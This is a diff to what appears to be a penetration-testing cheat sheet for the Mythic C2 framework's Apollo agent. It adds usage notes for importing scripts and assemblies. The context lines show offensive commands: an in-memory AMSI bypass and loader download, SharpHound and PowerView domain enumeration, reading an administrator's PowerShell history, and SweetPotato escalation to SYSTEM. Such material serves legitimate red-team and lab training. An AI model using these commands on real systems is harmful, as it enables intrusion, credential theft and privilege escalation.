@@ -114,6 +114,8 @@ To update the Mythic config files the best option is just crate a Payload using 
 
 > Note: REPLACE IP `192.168.45.90` with your VPN IP and port `8080`
 
+> Note2: All the commands that have a `#powershell_import` or `#register_assembly` are commands to execute without the `#` and use the popup in the GUI to choose the correct `ps1` script or `exe`
+
 ### One liner PowerShell
 
 Download and execute a remote PowerShell AMSI bypass and Loader in memory to load Mythic Apollo agent.
@@ -187,7 +189,7 @@ Collect AD data with `SharpHound` PowerShell.
 > First, `powershell_import` and import the sharphound.ps1 script.
 
 ```
-#powershell_import
+#powershell_import SharpHound.ps1
 powershell Invoke-BloodHound -CollectionMethod All
 ```
 
@@ -265,7 +267,7 @@ forge_net_Seatbelt "-group=all -full"
 Enumerate AD ACLs and locate admin access and user locations.
 
 ```
-powershell_import PowerView.ps1
+#powershell_import PowerView.ps1
 
 powershell Find-InterestingDomainAcl -ResolveGUIDs
 
@@ -415,7 +417,7 @@ cat C:\Users\administrator\AppData\Roaming\Microsoft\PowerShell\PSReadLine\Conso
 Run SweetPotato or EfsPotato style escalation to spawn a payload as SYSTEM.
 
 ```
-register_assembly SweetPotato.exe
+#register_assembly SweetPotato.exe
 
 execute_assembly {"assembly_name":"SweetPotato.exe","assembly_arguments":"-p C:\\temp\\apollo-local.exe"}
 ```
